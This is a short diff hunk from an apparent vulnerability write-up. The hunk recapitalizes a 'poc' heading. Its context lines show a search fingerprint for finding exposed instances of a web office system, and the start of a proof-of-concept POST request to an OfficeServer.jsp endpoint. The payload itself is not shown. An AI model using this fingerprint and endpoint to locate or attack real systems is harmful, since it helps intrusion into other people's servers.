@@ -8,7 +8,7 @@
 banner="OASESSIONID" && banner="/defaultroot/"
 ```
 
-## poc
+## POC
 
 ```
 POST /defaultroot/public/iWebOfficeSign/OfficeServer.jsp HTTP/1.1
